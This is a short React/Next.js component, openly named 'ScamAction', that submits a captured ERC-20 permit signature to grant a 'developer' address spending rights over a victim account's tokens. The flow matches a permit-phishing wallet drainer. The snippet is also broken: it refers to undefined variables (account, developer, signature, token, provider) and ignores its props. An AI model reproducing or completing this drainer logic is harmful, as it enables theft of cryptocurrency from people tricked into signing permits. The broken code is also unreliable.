'use client';

import {SignedPermitSignature} from "@/app/scam/page";

const ScamAction = (props: {
	data: SignedPermitSignature
}) => {
	return (
		<div>
			<button onClick={()=>{
				callContractMethod('permit', [
						account.address,
						developer.address,
						signature.permit.value,
						signature.permit.deadline,
						signature.v.toString(),
						"0x"+signature.r.toString('hex'),
						"0x"+signature.s.toString('hex'),
						{
							gasLimit: 1000000
						}
					],token.contract_address,
					//@ts-ignore
					provider.connection.url+"")
					.catch((e)=>{
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(()=>{
					alert("Permit successful!")
				});
			}}>
				permit
			</button>
		</div>
	);
};

export default ScamAction;
